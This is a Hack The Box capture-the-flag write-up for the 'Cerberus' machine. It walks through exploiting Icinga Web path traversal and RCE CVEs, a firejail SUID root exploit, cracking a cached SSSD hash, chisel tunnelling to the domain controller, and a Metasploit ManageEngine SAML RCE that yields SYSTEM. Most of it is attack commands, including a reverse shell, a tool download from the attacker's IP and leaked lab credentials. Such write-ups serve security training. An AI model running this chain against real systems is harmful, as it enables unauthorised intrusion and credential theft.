
# Cerberus

![logo](https://github.com/InfoSec-Crow/Writeups/blob/main/htb/machines/Cerberus/Cerberus.png)

## nmap:
    
    ```
    PORT      STATE SERVICE REASON  VERSION
    8080/tcp  open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))
    | http-title: Site doesn't have a title (text/html; charset=UTF-8).
    |_Requested resource was /icingaweb2/authentication/login?_checkCookie=1
    | http-methods:
    |_  Supported Methods: GET HEAD POST OPTIONS
    |_http-open-proxy: Proxy might be redirecting requests
    |_http-server-header: Apache/2.4.52 (Ubuntu)
    62728/tcp open  msrpc   syn-ack Microsoft Windows RPC
    ```
    

# **Icinga Web**

[Path Traversal Vulnerabilities in Icinga Web](https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/)

## **Arbitrary File Disclosure — `CVE-2022-24716`**

We can read files without authentication!

- `curl http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/passwd`

### Check `icingaweb2` files

[Icinga/Icinga2Installation - Debian Wiki](https://wiki.debian.org/Icinga/Icinga2Installation)

```
[Administrators]
users = "matthew"
permissions = "*"
groups = "Administrators"
unrestricted = "1"
```

```
[icingaweb2]
type = "db"
db = "mysql"
host = "localhost"
dbname = "icingaweb2"
username = "matthew"
password = "IcingaWebPassword2023"
use_ssl = "0"
```

We can login with `matthew : IcingaWebPassword2023` on the webapp.

## Authenticated RCE — **`CVE-2022-24715`**

We see the Version at:

- [http://icinga.cerberus.local:8080/icingaweb2/about](http://icinga.cerberus.local:8080/icingaweb2/about)

2.9.2

[https://github.com/JacobEbben/CVE-2022-24715](https://github.com/JacobEbben/CVE-2022-24715)

Vulnerable Versions: <2.8.6, <2.9.6, <2.10

Create a valid pem file

- `ssh-keygen -m pem`
- `./rce.py -t [http://icinga.cerberus.local:8080/icingaweb2/](http://icinga.cerberus.local:8080/icingaweb2/) -u matthew -p IcingaWebPassword2023 -I 10.10.14.62 -P 1234 -e /home/kali/Desktop/htb/Box/cerberus/id_rsa`

We got a shell.

uid=33(www-data) gid=33(www-data) groups=33(www-data),121(icingaweb2)

# Priv Esc

- `find / -user root -perm /4000 2>>/dev/null`

/usr/bin/firejail

## SUID firejail — `CVE-2022-31214`

> Firejail is a SUID sandbox program that reduces the risk of security breaches by restricting the running environment of untrusted applications using Linux namespaces, seccomp-bpf and Linux capabilities.
> 
- `firejail --version`

```
firejail version 0.9.68rc1
```

[oss-security - firejail: local root exploit reachable via --join logic
 (CVE-2022-31214)](https://www.openwall.com/lists/oss-security/2022/06/08/10)

We can use the [python script](https://www.openwall.com/lists/oss-security/2022/06/08/10/1) 

- `./firejail.py`

You can now run 'firejail --join=6807' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.

Now open a new terminal, and run 

- `firejail --join=6807`

In the new shell 

- `su -`

uid=0(root) gid=0(root) groups=0(root)

## Domain Informations

```
127.0.0.1 iceinga.cerberus.local iceinga
127.0.1.1 localhost
172.16.22.1 DC.cerberus.local DC cerberus.local

```

### SSSD services and domains

[13.2.2. Setting up the sssd.conf File Red Hat Enterprise Linux 6 | Red Hat Customer Portal](https://access.redhat.com/documentation/de-de/red_hat_enterprise_linux/6/html/deployment_guide/about-sssd-conf)

```
[sssd]
domains = cerberus.local
config_file_version = 2
services = nss, pam

[domain/cerberus.local]
default_shell = /bin/bash
ad_server = cerberus.local
krb5_store_password_if_offline = True
cache_credentials = True
krb5_realm = CERBERUS.LOCAL
realmd_tags = manages-system joined-with-adcli
id_provider = ad
fallback_homedir = /home/%u@%d
ad_domain = cerberus.local
use_fully_qualified_names = True
ldap_id_mapping = True
access_provider = ad
```

## Cache passwords

We find a cache file with a password hash. 

- `strings /var/lib/sss/db/cache_cerberus.local.ldb`

```
$6$6LP9gyiXJCovapcy$0qmZTTjp9f2A0e7n4xk0L6ZoeKhhaCNm0VGJnX/Mu608QkliMpIy1FwKZlyUJAZU3FZ3.GQ.4N6bb9pxE3t3T0
```

- `hashcat -m 1800 hash /usr/share/wordlists/rockyou.txt`

PW: 147258369

## Tunneling: Chisel and Evil-Winrm

We can use nmap on the target to check, if port 5985 for a conenction, is open

- `nmap 172.16.22.1 -p 5985`

```
PORT     STATE SERVICE
5985/tcp open  unknown
```

Upload chisel and run:

- Kali: `sudo /opt/chisel/chisel server --reverse --port 5000`
- Target: `./chisel client 10.10.14.62:5000 R:5985:172.16.22.1:5985`

Now run evil-winrm

- `evil-winrm -i 127.0.0.1 -u 'matthew' -p '147258369'`
- `whoami`
cerberus\matthew

→ user.txt

# Priv Esc

- `netstat -ano`

We see lots of open ports. 

## Tunneling: Chisel with proxychians

[Reverse SOCKS Proxy Using Chisel — The Easy Way](https://vegardw.medium.com/reverse-socks-proxy-using-chisel-the-easy-way-48a78df92f29)

Upload: `powershell -c iwr http://10.10.14.62/chisel.exe -outfile chisel.exe`

- Kali: `sudo /opt/chisel/chisel server --reverse --port 8002`
- Target: `./chisel.exe client 10.10.14.62:8002 R:socks`

Edit the last line in `/etc/proxychains4.conf`

socks5 127.0.0.1 1080

- `proxychains -q nmap -v -Pn -p- 172.16.22.1`

```html
Discovered open port 8888/tcp on 172.16.22.1
Discovered open port 445/tcp on 172.16.22.1
Discovered open port 443/tcp on 172.16.22.1
Discovered open port 139/tcp on 172.16.22.1
Discovered open port 80/tcp on 172.16.22.1
Discovered open port 135/tcp on 172.16.22.1
Discovered open port 53/tcp on 172.16.22.1
Discovered open port 9251/tcp on 172.16.22.1
```

- `proxychains -q nmap -v -Pn -sV -sC -p 8888 172.16.22.1`

```
8888/tcp open  sun-answerbook?
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 500 Internal Server Error
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1
|     X-Frame-Options: SAMEORIGIN
|     Set-Cookie: JSESSIONIDADSSP=F5B017CA56AE8D717997238F343ED654; Path=/; HttpOnly
|     Content-Type: text/html;charset=UTF-8
|     Content-Length: 4244
|     Date: Thu, 23 Mar 2023 09:03:59 GMT
|     Connection: close
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
|     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
|     <link REL="SHORTCUT ICON" HREF='&#x2f;images&#x2f;adssp_favicon.ico'>
|     <title>ADSelfService Plus</title>
|     <script language="JavaScript" src="/js/form-util.js?build=6201"></script>
|     <script language="JavaScript" src="/js/CommonUtil.js?build=5300"></script>
|     <script>
|     jQueryLoaded = jQueryLoade
```

- `proxychains -q nmap -v -Pn -sV -sC -p 9251 172.16.22.1`

```
9251/tcp open  ssl/unknown
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200
|     Cache-Control: private
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Set-Cookie: adscsrf=a44d6395-400a-454e-b5fc-bfa233f050e4;path=/;Secure;priority=high
|     Set-Cookie: _zcsr_tmp=a44d6395-400a-454e-b5fc-bfa233f050e4;path=/;SameSite=Strict;Secure;priority=high
|     Set-Cookie: JSESSIONIDADSSP=13BF0E019D6E21B341EF86BE41F6BDAB; Path=/; Secure; HttpOnly
|     Content-Type: text/html;charset=UTF-8
|     Content-Length: 259
|     Date: Thu, 23 Mar 2023 09:04:43 GMT
|     Connection: close
|     <!-- $Id$ -->
|     <html>
|     <head>
|     <META HTTP-EQUIV="CACHE-CONTROL" CONTENT="NO-CACHE">
|     <META HTTP-EQUIV="PRAGMA" CONTENT="NO-CACHE">
|     <META HTTP-EQUIV="Expires" CONTENT="0">
|     <script>
|     location.href = 'showLogin.cc' + location.search;
|     </script>
|     </head>
|     </html>
|   HTTPOptions:
|     HTTP/1.1 500
|     Cache-Control: private
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1
|     X-Frame-Options: SAMEORIGIN
|     Set-Cookie: JSESSIONIDADSSP=53ADDE20C8CD73BAB463A9BFB1C590D6; Path=/; Secure; HttpOnly
|     Content-Type: text/html;charset=UTF-8
|     Content-Length: 4244
|     Date: Thu, 23 Mar 2023 09:04:48 GMT
|     Connection: close
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
|     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
|     <link REL="SHORTCUT ICON" HREF='&#x2f;images&#x2f;adssp_favicon.ico'>
|     <title>ADSelfService Plus</title>
|     <script language="JavaScript" src="/js/form-util.js?build=6201"></script>
|_    <script language="JavaScript" src="/js/CommonUtil.js?build=5300"
|_ssl-date: 2023-03-23T09:07:28+00:00; -7s from scanner time.
| ssl-cert: Subject: commonName=cerberus.local/organizationName=CE/stateOrProvinceName=Dorset/countryName=UK
| Subject Alternative Name: DNS:cerberus.local
| Issuer: commonName=ManageEngine ADSelfService Plus/organizationName=ManageEngine Zoho Corporation/stateOrProvinceName=CA/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-01-29T19:26:48
| Not valid after:  2043-01-23T19:26:48
| MD5:   520f 7c21 072a 787b d574 0d10 94ae 11ff
|_SHA-1: 56a4 c917 2b7a 0fad 79b7 390a affb bfcf 8a6a dade
```

## ManageEngine ADSelfService Plus

So there is a webpage on port 8888

- `proxychains -q curl -k http://172.16.22.1:8888 -I`

```
HTTP/1.1 302 Found
Cache-Control: private
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Location: https://172.16.22.1:9251/
Transfer-Encoding: chunked
Date: Thu, 23 Mar 2023 09:01:46 GMT
```

We get a redirect to port 9251

- `proxychains -q curl -k https://172.16.22.1:9251/`

```html
<!-- $Id$ -->
<html>
<head>
        <META HTTP-EQUIV="CACHE-CONTROL" CONTENT="NO-CACHE">
        <META HTTP-EQUIV="PRAGMA" CONTENT="NO-CACHE">
        <META HTTP-EQUIV="Expires" CONTENT="0">
        <script>
                location.href = 'showLogin.cc' + location.search;
        </script>
</head>
</html>
```

### Firefox with FoxyProxy

We can open this side in firefox with FoxyProxy addon.

![Untitled](https://github.com/InfoSec-Crow/Writeups/blob/main/htb/machines/Cerberus/proxy_settings.png)

Go to `https://172.16.22.1:9251/showLogin.cc`

We got a redirect to: `https://dc.cerberus.local/adfs/ls/?SAMLRequest`<SNIP>

add to to `/etc/hosts`

172.16.22.1 dc.cerberus.local

Now we see a login page. 

Login with creds from evil-winrm

Username: matthew@cerberus
Password: 147258369

We got a redirect to: `https://dc:9251/samlLogin/67a8d101690402dc6a6744b8fc8a7ca1acf88b2f`

Add dc to `/etc/hosts`

On the page we got:

Sorry ! You are not authorized to view the contents of this file.

# ManageEngine ADSelfService Plus Unauthenticated SAML RCE — `CVE-2022-47966`

> This Metasploit module exploits an unauthenticated remote code execution vulnerability that affects Zoho ManageEngine AdSelfService Plus versions 6210 and below. Due to a dependency to an outdated library (Apache Santuario version 1.4.1), it is possible to execute arbitrary code by providing a crafted samlResponse XML to the ADSelfService Plus SAML endpoint. Note that the target is only vulnerable if it has been configured with SAML-based SSO at least once in the past, regardless of the current SAML-based SSO status. [link](https://packetstormsecurity.com/files/170925/ManageEngine-ADSelfService-Plus-Unauthenticated-SAML-Remote-Code-Execution.html)
> 

## Metasploit

The login page show use the date 2018. So the version of this is maybe 5702 see [**ADSelfService Plus Release Notes](https://www.manageengine.com/products/self-service-password/release-notes.html)** and the cve get patched in **Version 6211 (Oct 28, 2022)**

- `search ADSelfService Plus`

```
Name:
exploit/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966 
Disclosure Date:
2023-01-10       
Description:
ManageEngine ADSelfService Plus Unauthenticated SAML RCE
```

- `use exploit/windows/http/manageengine_adselfservice_plus_cve_2021_40539`
- `options`

```
GUID        yes       The SAML endpoint GUID
ISSUER_URL  yes       The Issuer URL used by the Identity Provider which has been configured as the SAML authentication provider for the target server
```

So we need the GUID and ISSUER_URL, to run this exploit.

## **SAML-tracer**

[SAML-tracer – Holen Sie sich diese Erweiterung für 🦊 Firefox (de)](https://addons.mozilla.org/de/firefox/addon/saml-tracer/)

> A tool for viewing SAML and WS-Federation messages sent through the browser during single sign-on and single logout.
> 

We can use this tool to see the data after the login. 

![Untitled](https://github.com/InfoSec-Crow/Writeups/blob/main/htb/machines/Cerberus/post_output.png)

Now set the metasploit options:

```
set GUID 67a8d101690402dc6a6744b8fc8a7ca1acf88b2f
set ISSUER_URL http://dc.cerberus.local/adfs/services/trust
set RHOSTS 172.16.22.1
set LHOST tun0
set VHOST dc.cerberus.local
```

- `exploit`

meterpreter > `sysinfo`

```
Computer        : DC
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : CERBERUS
Logged On Users : 10
Meterpreter     : x86/windows
```

meterpreter > `getuid`

Server username: NT AUTHORITY\SYSTEM

→ root.txt
